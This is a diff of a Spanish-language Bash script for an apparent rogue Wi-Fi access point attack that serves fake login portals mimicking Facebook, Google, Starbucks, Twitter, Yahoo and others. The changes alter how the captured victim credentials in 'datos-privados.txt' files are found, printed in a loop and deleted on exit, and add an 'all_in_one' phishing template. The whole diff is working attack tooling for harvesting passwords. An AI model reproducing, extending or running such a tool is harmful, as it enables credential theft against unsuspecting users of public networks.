@@ -17,7 +17,8 @@ trap ctrl_c INT
 function ctrl_c(){
 	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
 	rm dnsmasq.conf hostapd.conf 2>/dev/null
-	rm -r iface $template/datos-privados.txt $template/portal_2fa/datos-privados.txt 2>/dev/null
+	rm -r iface 2>/dev/null
+	find \-name datos-privados.txt | xargs rm 2>/dev/null
 	sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
 	iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
 	ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
@@ -80,7 +81,7 @@ function getCredentials(){
 	while true; do
 		echo -e "\n${yellowColour}[*]${endColour}${grayColour} Esperando credenciales (${endColour}${redColour}Ctr+C para finalizar${endColour}${grayColour})...${endColour}\n${endColour}"
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
-		cat $template/datos-privados.txt $template/portal_2fa/datos-privados.txt 2>/dev/null
+		find \-name datos-privados.txt | xargs cat 2>/dev/null
 		for i in $(seq 1 60); do echo -ne "${redColour}-"; done && echo -e "${endColour}"
 		sleep 3; clear
 	done
@@ -151,10 +152,10 @@ function startAttack(){
 	sleep 5
 
 	# Array de plantillas
-	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi)
+	plantillas=(facebook-login google-login starbucks-login twitter-login yahoo-login cliqq-payload optimumwifi all_in_one)
 
 	tput cnorm; echo -ne "\n${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}\n\n"
-	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, optimumwifi):${endColour} " && read template
+	echo -ne "${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} " && read template
 
 	check_plantillas=0; for plantilla in "${plantillas[@]}"; do
 		if [ "$plantilla" == "$template" ]; then
